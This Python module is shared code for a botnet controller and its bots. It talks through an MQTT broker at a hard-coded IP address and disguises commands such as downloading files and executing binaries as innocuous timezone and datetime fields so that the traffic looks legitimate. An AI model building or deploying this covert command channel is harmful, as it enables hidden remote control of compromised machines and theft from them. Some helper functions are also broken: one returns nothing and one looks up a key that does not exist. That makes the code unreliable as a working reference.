# Common code for both controller and bot
from paho.mqtt import client as mqtt
import random
import base64
import json

# MQTT configuration
MQTT_BROKER = "147.32.82.209"
MQTT_PORT = 1883
MQTT_TOPIC = "sensors"

# Message fields
MSG_FIELD_TO_FAKE_LEGITIMATE = "local_datetime" # will send legitimate local datetime, just to act trustworthy
MSG_FIELD_BOT_ID = "local_datetime_leap"
MSG_FIELD_ENCRYPTED_MSG = "datetime_leap"
MSG_FIELD_TIMEZONES = "timezones"
MSG_FIELD_ACTION = "timezone"

# Commands
CMD_LIST_BOTS = 1
CMD_LIST_USERS = 2
CMD_LIST_DIR = 3
CMD_GET_USER_ID = 4
CMD_DOWNLOAD_FILE = 5
CMD_EXECUTE_BINARY = 6

COMMAND_TO_TIMEZONE = {
    CMD_LIST_BOTS: "America/New_York",
    CMD_LIST_USERS: "America/Los_Angeles",
    CMD_LIST_DIR: "America/Chicago",
    CMD_GET_USER_ID: "Europe/London",
    CMD_DOWNLOAD_FILE: "Europe/Paris",
    CMD_EXECUTE_BINARY: "Europe/Berlin",
}

TIMEZONE_TO_ACTION = {v.upper(): k for k, v in COMMAND_TO_TIMEZONE.items()}

CHAR_TO_TIMEZONE = {
    "A": "America/Anchorage",
    "B": "Europe/Berlin",
    "C": "America/Chicago",
    "D": "Asia/Dubai",
    "E": "Europe/Edinburgh",
    "F": "America/Fortaleza",
    "G": "Europe/Gibraltar",
    "H": "Pacific/Honolulu",
    "I": "Asia/Istanbul",
    "J": "Asia/Jakarta",
    "K": "Europe/Kiev",
    "L": "Europe/London",
    "M": "America/Mexico_City",
    "N": "America/New_York",
    "O": "Europe/Oslo",
    "P": "Europe/Prague",
    "Q": "America/Quebec",
    "R": "Europe/Rome",
    "S": "Asia/Shanghai",
    "T": "Asia/Tokyo",
    "U": "Asia/Ulaanbaatar",
    "V": "Europe/Vienna",
    "W": "Europe/Warsaw",
    "X": "America/Cancun",  # X is difficult - using location with X sound
    "Y": "America/Yakutat",
    "Z": "Europe/Zurich",
    ",": "Africa/Johannesburg",
    " ": "Africa/Lagos",
}

TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}


def do_very_strange_encryption(text: str):
    encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
    
    # char_to_timezone values
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    chunks = []
    i = 0
    while i < len(encoded):
        chunk_size = random.randint(7, 20)
        chunks.append(encoded[i:i+chunk_size])
        i += chunk_size
    
    # create JSON mapping timezones to chunks, cycling through timezones if needed
    result = {}
    for idx, chunk in enumerate(chunks):
        timezone = timezones[idx % len(timezones)]
        if timezone not in result:
            result[timezone] = []
        result[timezone].append(chunk)
    
    return json.dumps(result)


def do_very_strange_decryption(encrypted_json: str):
    data = json.loads(encrypted_json)
    
    # char_to_timezone values
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    # Reconstruct chunks in correct order
    chunks = []
    timezone_idx = 0
    chunk_counts = {tz: 0 for tz in timezones}
    
    # Continue until all chunks are collected
    while True:
        current_tz = timezones[timezone_idx % len(timezones)]
        
        if current_tz in data and chunk_counts[current_tz] < len(data[current_tz]):
            chunks.append(data[current_tz][chunk_counts[current_tz]])
            chunk_counts[current_tz] += 1
            timezone_idx += 1
        else:
            # Check if we've collected all chunks
            all_collected = all(
                tz not in data or chunk_counts[tz] == len(data[tz])
                for tz in timezones
            )
            if all_collected:
                break
            timezone_idx += 1
            
        # Safety check to avoid infinite loop
        if timezone_idx > 10000:
            break
    
    # Concatenate chunks and decode
    encoded = ''.join(chunks)
    decoded = base64.b64decode(encoded).decode('utf-8')
    return decoded

def encode_as_timezones(text: str):
    # convert each character to its corresponding timezone
    encoded = []
    for char in text.upper():
        if char in CHAR_TO_TIMEZONE:
            encoded.append(CHAR_TO_TIMEZONE[char])
        else: # char missing in dictionary
            encoded.append(CHAR_TO_TIMEZONE[', '])

def decode_as_timezones(timezones_encoded_msg):
    # convert list of timezones back to characters
    decoded = []
    for tz in timezones_encoded_msg:
        if tz.upper() in TIMEZONE_TO_CHAR:
            decoded.append(TIMEZONE_TO_CHAR[tz.upper()])
    return ''.join(decoded)

def encode(text: str):
    if len(text) <= 100:
        return [MSG_FIELD_TIMEZONES, encode_as_timezones(text)]
    else:
        return [MSG_FIELD_ENCRYPTED_MSG, do_very_strange_encryption(text)]
